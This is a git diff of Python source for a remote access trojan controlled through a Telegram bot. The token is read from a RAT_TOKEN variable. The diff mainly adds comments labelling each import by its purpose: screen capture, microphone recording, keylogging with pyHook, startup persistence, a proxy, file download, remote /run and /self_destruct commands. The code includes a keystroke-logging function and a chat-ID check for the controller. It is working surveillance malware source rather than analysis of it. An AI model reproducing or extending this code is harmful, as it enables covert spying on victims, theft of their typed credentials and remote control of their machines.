@@ -1,20 +1,22 @@
 #!/usr/bin/env python
-from PIL import ImageGrab #/capture_pc
-from shutil import copyfile, copyfileobj, rmtree #/ls, /pwd, /cd /copy
-from sys import argv, path, stdout
-from json import loads
-from winshell import startup
-from tendo import singleton
-from win32com.client import Dispatch
-from time import strftime, sleep
+from PIL import ImageGrab 							# /capture_pc
+from shutil import copyfile, copyfileobj, rmtree 	# /ls, /pwd, /cd /copy
+from sys import argv, path, stdout 					# console output
+from json import loads 								# reading json from ipinfo.io
+from winshell import startup 						# persistence
+from tendo import singleton							# this makes the application exit if there's another instance already running
+from win32com.client import Dispatch				# used for WScript.Shell
+from time import strftime, sleep					
 import time
-import threading
-import pyaudio, wave #/hear
-import telepot, requests
-import os, os.path, platform, ctypes
-import pyHook, pythoncom
+import threading 									#used for proxy
 import proxy
-me = singleton.SingleInstance()
+import pyaudio, wave 								# /hear
+import telepot, requests 							# telepot => telegram, requests => file download
+import os, os.path, platform, ctypes
+import pyHook, pythoncom 							# keylogger
+
+me = singleton.SingleInstance() 
+
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
 token = os.environ['RAT_TOKEN'] # you can set your environment variable as well
@@ -57,11 +59,13 @@ functionalities = { '/capture_pc' : '', \
 					'/run':'<target_file>', \
 					'/self_destruct':'', \
 					'/to':'<target_computer>, [other_target_computer]'}
-def checkchat_id(chat_id):
-	return len(known_ids) == 0 or str(chat_id) in known_ids
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
+	
+def checkchat_id(chat_id):
+	return len(known_ids) == 0 or str(chat_id) in known_ids
+	
 def pressed_chars(event):
 	if event and type(event.Ascii) == int:
 		f = open(log_file,"a")
@@ -74,6 +78,7 @@ def pressed_chars(event):
 		else:
 			stdout.write(tofile)
 	return True
+	
 def handle(msg):
 	chat_id = msg['chat']['id']
 	if checkchat_id(chat_id):
